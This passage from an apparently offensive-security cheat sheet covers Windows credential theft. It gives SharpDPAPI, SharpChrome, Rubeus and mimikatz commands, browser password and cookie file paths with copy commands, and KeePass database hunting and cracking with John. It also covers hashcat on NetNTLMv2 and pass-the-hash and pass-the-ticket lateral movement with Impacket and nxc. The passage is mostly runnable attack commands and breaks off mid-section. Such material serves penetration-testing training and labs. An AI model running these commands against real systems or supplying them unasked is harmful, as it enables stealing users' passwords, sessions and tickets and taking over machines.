+<div class="language-text highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>SharpDPAPI.exe credentials
+</span></code></pre></div>
+<p>Vaults:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>SharpDPAPI.exe vaults
+</span></code></pre></div>
+<p>RDCMan/RDP-related secrets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>SharpDPAPI.exe rdg
+</span></code></pre></div>
+<p>Browser-related DPAPI data:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>SharpDPAPI.exe triage
+</span></code></pre></div>
+<p>Remote triage when local admin:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>SharpDPAPI.exe triage /server:HOSTNAME
+</span></code></pre></div>
+<p>Using password:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>SharpDPAPI.exe credentials /password:Password123!
+</span></code></pre></div>
+<p>Using NTLM:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>SharpDPAPI.exe credentials /ntlm:8846f7eaee8fb117ad06bdd830b7586c
+</span></code></pre></div>
+<p><strong>Domain backup key concept</strong></p>
+<p>In domain environments, DPAPI domain backup keys may allow decryption of domain user DPAPI secrets if the backup key is obtained.</p>
+<p>This is a high-impact domain credential access path and usually requires high privileges.</p>
+<p><strong>Useful outputs</strong></p>
+<table>
+<thead>
+<tr>
+<th>Output</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Masterkey GUID</td>
+<td>Identifies DPAPI masterkey.</td>
+</tr>
+<tr>
+<td>Decrypted credential</td>
+<td>Saved Windows credential.</td>
+</tr>
+<tr>
+<td>Vault entry</td>
+<td>Saved secret from Windows Vault.</td>
+</tr>
+<tr>
+<td>Browser secret</td>
+<td>Browser credential/cookie protected by DPAPI.</td>
+</tr>
+<tr>
+<td>RDG/RDP secret</td>
+<td>Remote Desktop credential material.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="browser-credentials">Browser Credentials</h2>
+<p>Browsers may store saved passwords, cookies, tokens, session data, history, and autofill data.</p>
+<p>On Windows, browser secrets are commonly protected with DPAPI.</p>
+<p>Common browser targets:</p>
+<table>
+<thead>
+<tr>
+<th>Browser</th>
+<th>Common Windows path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Chrome</td>
+<td><code>C:\Users\&lt;user&gt;\AppData\Local\Google\Chrome\User Data\</code></td>
+</tr>
+<tr>
+<td>Edge</td>
+<td><code>C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Edge\User Data\</code></td>
+</tr>
+<tr>
+<td>Brave</td>
+<td><code>C:\Users\&lt;user&gt;\AppData\Local\BraveSoftware\Brave-Browser\User Data\</code></td>
+</tr>
+<tr>
+<td>Firefox</td>
+<td><code>C:\Users\&lt;user&gt;\AppData\Roaming\Mozilla\Firefox\Profiles\</code></td>
+</tr>
+</tbody>
+</table>
+<p>Interesting Chromium files:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>Local State
+</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2" href="#__codelineno-117-2"></a>Default\Login Data
+</span><span id="__span-117-3"><a id="__codelineno-117-3" name="__codelineno-117-3" href="#__codelineno-117-3"></a>Default\Cookies
+</span><span id="__span-117-4"><a id="__codelineno-117-4" name="__codelineno-117-4" href="#__codelineno-117-4"></a>Default\History
+</span><span id="__span-117-5"><a id="__codelineno-117-5" name="__codelineno-117-5" href="#__codelineno-117-5"></a>Default\Web Data
+</span><span id="__span-117-6"><a id="__codelineno-117-6" name="__codelineno-117-6" href="#__codelineno-117-6"></a>Default\Bookmarks
+</span><span id="__span-117-7"><a id="__codelineno-117-7" name="__codelineno-117-7" href="#__codelineno-117-7"></a>Default\Network\Cookies
+</span></code></pre></div>
+<p>Interesting Firefox files:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>logins.json
+</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a>key4.db
+</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#__codelineno-118-3"></a>cookies.sqlite
+</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#__codelineno-118-4"></a>places.sqlite
+</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5" href="#__codelineno-118-5"></a>permissions.sqlite
+</span><span id="__span-118-6"><a id="__codelineno-118-6" name="__codelineno-118-6" href="#__codelineno-118-6"></a>cert9.db
+</span></code></pre></div>
+<p><strong>Find browser profiles</strong></p>
+<p>PowerShell:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a><span class="nb">Get-ChildItem</span> <span class="s2">&quot;C:\Users&quot;</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="n">-Include</span> <span class="s2">&quot;Login Data&quot;</span><span class="p">,</span><span class="s2">&quot;Cookies&quot;</span><span class="p">,</span><span class="s2">&quot;Local State&quot;</span><span class="p">,</span><span class="s2">&quot;logins.json&quot;</span><span class="p">,</span><span class="s2">&quot;key4.db&quot;</span>
+</span></code></pre></div>
+<p>CMD:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>dir /s /b &quot;C:\Users\*\AppData\Local\Google\Chrome\User Data\Local State&quot;
+</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a>dir /s /b &quot;C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Local State&quot;
+</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3" href="#__codelineno-120-3"></a>dir /s /b &quot;C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json&quot;
+</span></code></pre></div>
+<p><strong>Chromium files to collect in labs</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>Local State
+</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a>Login Data
+</span><span id="__span-121-3"><a id="__codelineno-121-3" name="__codelineno-121-3" href="#__codelineno-121-3"></a>Cookies
+</span><span id="__span-121-4"><a id="__codelineno-121-4" name="__codelineno-121-4" href="#__codelineno-121-4"></a>History
+</span><span id="__span-121-5"><a id="__codelineno-121-5" name="__codelineno-121-5" href="#__codelineno-121-5"></a>Web Data
+</span><span id="__span-121-6"><a id="__codelineno-121-6" name="__codelineno-121-6" href="#__codelineno-121-6"></a>Bookmarks
+</span></code></pre></div>
+<p>Copy carefully because SQLite files may be locked if the browser is running.</p>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>copy &quot;C:\Users\alice\AppData\Local\Google\Chrome\User Data\Local State&quot; C:\Windows\Temp\
+</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#__codelineno-122-2"></a>copy &quot;C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; C:\Windows\Temp\
+</span></code></pre></div>
+<p><strong>Firefox files to collect in labs</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a>logins.json
+</span><span id="__span-123-2"><a id="__codelineno-123-2" name="__codelineno-123-2" href="#__codelineno-123-2"></a>key4.db
+</span><span id="__span-123-3"><a id="__codelineno-123-3" name="__codelineno-123-3" href="#__codelineno-123-3"></a>cookies.sqlite
+</span><span id="__span-123-4"><a id="__codelineno-123-4" name="__codelineno-123-4" href="#__codelineno-123-4"></a>places.sqlite
+</span></code></pre></div>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a>copy &quot;C:\Users\alice\AppData\Roaming\Mozilla\Firefox\Profiles\&lt;profile&gt;\logins.json&quot; C:\Windows\Temp\
+</span><span id="__span-124-2"><a id="__codelineno-124-2" name="__codelineno-124-2" href="#__codelineno-124-2"></a>copy &quot;C:\Users\alice\AppData\Roaming\Mozilla\Firefox\Profiles\&lt;profile&gt;\key4.db&quot; C:\Windows\Temp\
+</span></code></pre></div>
+<p><strong>SharpChrome</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a>SharpChrome.exe logins
+</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2" href="#__codelineno-125-2"></a>SharpChrome.exe cookies
+</span><span id="__span-125-3"><a id="__codelineno-125-3" name="__codelineno-125-3" href="#__codelineno-125-3"></a>SharpChrome.exe history
+</span></code></pre></div>
+<p><strong>SharpDPAPI browser-related triage</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a>SharpDPAPI.exe triage
+</span></code></pre></div>
+<p><strong>Linux analysis after copying</strong></p>
+<p>SQLite inspection:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a>sqlite3<span class="w"> </span><span class="s2">&quot;History&quot;</span><span class="w"> </span><span class="s2">&quot;select url,title,last_visit_time from urls limit 20;&quot;</span>
+</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2" href="#__codelineno-127-2"></a>sqlite3<span class="w"> </span><span class="s2">&quot;Login Data&quot;</span><span class="w"> </span><span class="s2">&quot;select origin_url,username_value from logins;&quot;</span>
+</span></code></pre></div>
+<p>Firefox:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a>ls<span class="w"> </span>-la
+</span><span id="__span-128-2"><a id="__codelineno-128-2" name="__codelineno-128-2" href="#__codelineno-128-2"></a>file<span class="w"> </span>logins.json<span class="w"> </span>key4.db
+</span></code></pre></div>
+<p><strong>Useful browser findings</strong></p>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Saved passwords</td>
+<td>Direct credential source.</td>
+</tr>
+<tr>
+<td>Cookies</td>
+<td>May contain active sessions.</td>
+</tr>
+<tr>
+<td>Tokens</td>
+<td>App/API access.</td>
+</tr>
+<tr>
+<td>History</td>
+<td>Internal apps and admin panels.</td>
+</tr>
+<tr>
+<td>Bookmarks</td>
+<td>Important internal URLs.</td>
+</tr>
+<tr>
+<td>Autofill</td>
+<td>Names, emails, addresses, usernames.</td>
+</tr>
+<tr>
+<td>Client certs</td>
+<td>Possible certificate-based access context.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="keepass-hunting">KeePass Hunting</h2>
+<p>KeePass databases are common password vault files.</p>
+<p>The main file extension is:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a>.kdbx
+</span></code></pre></div>
+<p>A KeePass database usually requires a master password, key file, Windows user account binding, or a combination.</p>
+<p>Common places to look:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a>C:\Users\&lt;user&gt;\Documents
+</span><span id="__span-130-2"><a id="__codelineno-130-2" name="__codelineno-130-2" href="#__codelineno-130-2"></a>C:\Users\&lt;user&gt;\Desktop
+</span><span id="__span-130-3"><a id="__codelineno-130-3" name="__codelineno-130-3" href="#__codelineno-130-3"></a>C:\Users\&lt;user&gt;\Downloads
+</span><span id="__span-130-4"><a id="__codelineno-130-4" name="__codelineno-130-4" href="#__codelineno-130-4"></a>C:\Users\&lt;user&gt;\AppData
+</span><span id="__span-130-5"><a id="__codelineno-130-5" name="__codelineno-130-5" href="#__codelineno-130-5"></a>Shares
+</span><span id="__span-130-6"><a id="__codelineno-130-6" name="__codelineno-130-6" href="#__codelineno-130-6"></a>Backups
+</span><span id="__span-130-7"><a id="__codelineno-130-7" name="__codelineno-130-7" href="#__codelineno-130-7"></a>IT folders
+</span></code></pre></div>
+<p><strong>Find KeePass files on Windows</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a>dir /s /b C:\Users\*.kdbx
+</span><span id="__span-131-2"><a id="__codelineno-131-2" name="__codelineno-131-2" href="#__codelineno-131-2"></a>dir /s /b C:\*.kdbx
+</span></code></pre></div>
+<p>PowerShell:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a><span class="nb">Get-ChildItem</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">kdbx</span><span class="p">,*.</span><span class="n">key</span><span class="p">,*.</span><span class="n">keyx</span>
+</span></code></pre></div>
+<p><strong>Find KeePass files in downloaded shares</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a>find<span class="w"> </span>.<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.kdbx&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.key&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.keyx&quot;</span>
+</span></code></pre></div>
+<p><strong>Look for key files</strong></p>
+<p>Common key file patterns:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a>*.key
+</span><span id="__span-134-2"><a id="__codelineno-134-2" name="__codelineno-134-2" href="#__codelineno-134-2"></a>*.keyx
+</span><span id="__span-134-3"><a id="__codelineno-134-3" name="__codelineno-134-3" href="#__codelineno-134-3"></a>keyfile
+</span><span id="__span-134-4"><a id="__codelineno-134-4" name="__codelineno-134-4" href="#__codelineno-134-4"></a>keepass.key
+</span><span id="__span-134-5"><a id="__codelineno-134-5" name="__codelineno-134-5" href="#__codelineno-134-5"></a>database.key
+</span></code></pre></div>
+<p><strong>Convert KDBX to crackable hash</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a>keepass2john<span class="w"> </span>database.kdbx<span class="w"> </span>&gt;<span class="w"> </span>keepass_hash.txt
+</span></code></pre></div>
+<p>If key file is needed, cracking may require additional handling depending on format and tool support.</p>
+<p><strong>Crack with John</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>keepass_hash.txt
+</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2" href="#__codelineno-136-2"></a>john<span class="w"> </span>--show<span class="w"> </span>keepass_hash.txt
+</span></code></pre></div>
+<p><strong>Open with kpcli</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a>kpcli<span class="w"> </span>--kdb<span class="w"> </span>database.kdbx
+</span></code></pre></div>
+<p><strong>Open with keepassxc-cli</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1" href="#__codelineno-138-1"></a>keepassxc-cli<span class="w"> </span>open<span class="w"> </span>database.kdbx
+</span></code></pre></div>
+<p>List entries after opening:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1" href="#__codelineno-139-1"></a>keepassxc-cli<span class="w"> </span>ls<span class="w"> </span>database.kdbx
+</span></code></pre></div>
+<p>Show entry:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1" href="#__codelineno-140-1"></a>keepassxc-cli<span class="w"> </span>show<span class="w"> </span>database.kdbx<span class="w"> </span><span class="s2">&quot;Entry Name&quot;</span>
+</span></code></pre></div>
+<p><strong>Search KeePass-related hints</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1" href="#__codelineno-141-1"></a>grep<span class="w"> </span>-RniE<span class="w"> </span><span class="s2">&quot;keepass|kdbx|master password|keyfile|password database&quot;</span><span class="w"> </span>.
+</span></code></pre></div>
+<p>Interesting nearby files:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>*.kdbx</code></td>
+<td>KeePass database.</td>
+</tr>
+<tr>
+<td><code>*.key</code> / <code>*.keyx</code></td>
+<td>Possible key file.</td>
+</tr>
+<tr>
+<td>Notes near database</td>
+<td>May contain master password hints.</td>
+</tr>
+<tr>
+<td>Backups</td>
+<td>Older database copies.</td>
+</tr>
+<tr>
+<td>Screenshots</td>
+<td>Sometimes show passwords or hints.</td>
+</tr>
+<tr>
+<td>Shortcut files</td>
+<td>Reveal database location.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="hashes-tickets-tokens">Hashes Tickets Tokens</h2>
+<p>Credential access often produces different kinds of authentication material.</p>
+<p>Do not treat all of them as the same thing.</p>
+<table>
+<thead>
+<tr>
+<th>Material</th>
+<th>Typical use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Plaintext password</td>
+<td>Normal authentication.</td>
+</tr>
+<tr>
+<td>NT hash</td>
+<td>Pass-the-Hash style authentication where accepted.</td>
+</tr>
+<tr>
+<td>NetNTLMv2</td>
+<td>Usually crack offline; not the same as NT hash.</td>
+</tr>
+<tr>
+<td>TGT</td>
+<td>Kerberos identity ticket.</td>
+</tr>
+<tr>
+<td>TGS</td>
+<td>Kerberos service ticket.</td>
+</tr>
+<tr>
+<td>Kirbi file</td>
+<td>Windows Kerberos ticket format.</td>
+</tr>
+<tr>
+<td>ccache file</td>
+<td>Linux Kerberos credential cache format.</td>
+</tr>
+<tr>
+<td>Access token</td>
+<td>Local Windows process security context.</td>
+</tr>
+<tr>
+<td>DPAPI masterkey</td>
+<td>Decrypts DPAPI-protected secrets.</td>
+</tr>
+<tr>
+<td>PFX/certificate</td>
+<td>Certificate-based authentication context.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>NT hash format</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1" href="#__codelineno-142-1"></a>aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+</span></code></pre></div>
+<p>Often used as:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1" href="#__codelineno-143-1"></a>LMHASH:NTHASH
+</span></code></pre></div>
+<p>If LM hash is not used:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1" href="#__codelineno-144-1"></a>aad3b435b51404eeaad3b435b51404ee
+</span></code></pre></div>
+<p><strong>NetNTLM vs NT hash</strong></p>
+<table>
+<thead>
+<tr>
+<th>Material</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NT hash</td>
+<td>Password-derived hash.</td>
+</tr>
+<tr>
+<td>NetNTLMv1/v2</td>
+<td>Challenge-response captured during NTLM authentication.</td>
+</tr>
+</tbody>
+</table>
+<p>NetNTLMv2 is usually cracked offline:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1" href="#__codelineno-145-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>netntlmv2.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+<p><strong>Kerberos tickets on Linux</strong></p>
+<p>Get TGT with password:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-146-1"><a id="__codelineno-146-1" name="__codelineno-146-1" href="#__codelineno-146-1"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>This creates:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-147-1"><a id="__codelineno-147-1" name="__codelineno-147-1" href="#__codelineno-147-1"></a>user.ccache
+</span></code></pre></div>
+<p>Use ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-148-1"><a id="__codelineno-148-1" name="__codelineno-148-1" href="#__codelineno-148-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span></code></pre></div>
+<p>Check ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-149-1"><a id="__codelineno-149-1" name="__codelineno-149-1" href="#__codelineno-149-1"></a>klist
+</span></code></pre></div>
+<p>Use Kerberos with Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-150-1"><a id="__codelineno-150-1" name="__codelineno-150-1" href="#__codelineno-150-1"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span><span id="__span-150-2"><a id="__codelineno-150-2" name="__codelineno-150-2" href="#__codelineno-150-2"></a>smbclient.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p><strong>Kerberos tickets on Windows</strong></p>
+<p>List tickets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-151-1"><a id="__codelineno-151-1" name="__codelineno-151-1" href="#__codelineno-151-1"></a>klist
+</span></code></pre></div>
+<p>Rubeus triage:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-152-1"><a id="__codelineno-152-1" name="__codelineno-152-1" href="#__codelineno-152-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">triage</span>
+</span></code></pre></div>
+<p>Dump tickets in a lab with appropriate privileges:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-153-1"><a id="__codelineno-153-1" name="__codelineno-153-1" href="#__codelineno-153-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">dump</span>
+</span></code></pre></div>
+<p>Dump only current logon session:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-154-1"><a id="__codelineno-154-1" name="__codelineno-154-1" href="#__codelineno-154-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">dump</span> <span class="p">/</span><span class="n">nowrap</span>
+</span></code></pre></div>
+<p>Mimikatz:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-155-1"><a id="__codelineno-155-1" name="__codelineno-155-1" href="#__codelineno-155-1"></a>mimikatz.exe
+</span><span id="__span-155-2"><a id="__codelineno-155-2" name="__codelineno-155-2" href="#__codelineno-155-2"></a>sekurlsa::tickets
+</span><span id="__span-155-3"><a id="__codelineno-155-3" name="__codelineno-155-3" href="#__codelineno-155-3"></a>kerberos::list
+</span></code></pre></div>
+<p>Export tickets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-156-1"><a id="__codelineno-156-1" name="__codelineno-156-1" href="#__codelineno-156-1"></a>kerberos::list /export
+</span></code></pre></div>
+<p><strong>Ticket formats</strong></p>
+<table>
+<thead>
+<tr>
+<th>Format</th>
+<th>Platform / tool</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.kirbi</code></td>
+<td>Windows Kerberos ticket format.</td>
+</tr>
+<tr>
+<td><code>.ccache</code></td>
+<td>MIT Kerberos cache format, common on Linux.</td>
+</tr>
+</tbody>
+</table>
+<p>Convert Kirbi to ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-157-1"><a id="__codelineno-157-1" name="__codelineno-157-1" href="#__codelineno-157-1"></a>ticketConverter.py<span class="w"> </span>ticket.kirbi<span class="w"> </span>ticket.ccache
+</span></code></pre></div>
+<p>Convert ccache to Kirbi:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-158-1"><a id="__codelineno-158-1" name="__codelineno-158-1" href="#__codelineno-158-1"></a>ticketConverter.py<span class="w"> </span>ticket.ccache<span class="w"> </span>ticket.kirbi
+</span></code></pre></div>
+<p><strong>Pass-the-Hash context</strong></p>
+<p>Example SMB authentication with NT hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-159-1"><a id="__codelineno-159-1" name="__codelineno-159-1" href="#__codelineno-159-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-160-1"><a id="__codelineno-160-1" name="__codelineno-160-1" href="#__codelineno-160-1"></a>psexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span><span id="__span-160-2"><a id="__codelineno-160-2" name="__codelineno-160-2" href="#__codelineno-160-2"></a>wmiexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span><span id="__span-160-3"><a id="__codelineno-160-3" name="__codelineno-160-3" href="#__codelineno-160-3"></a>smbexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p><strong>Pass-the-Ticket context</strong></p>
+<p>Linux with ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-161-1"><a id="__codelineno-161-1" name="__codelineno-161-1" href="#__codelineno-161-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/ticket.ccache
+</span><span id="__span-161-2"><a id="__codelineno-161-2" name="__codelineno-161-2" href="#__codelineno-161-2"></a>klist
+</span><span id="__span-161-3"><a id="__codelineno-161-3" name="__codelineno-161-3" href="#__codelineno-161-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</span></code></pre></div>
+<p>Impacket with Kerberos cache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-162-1"><a id="__codelineno-162-1" name="__codelineno-162-1" href="#__codelineno-162-1"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span><span id="__span-162-2"><a id="__codelineno-162-2" name="__codelineno-162-2" href="#__codelineno-162-2"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Windows with Rubeus:</p>
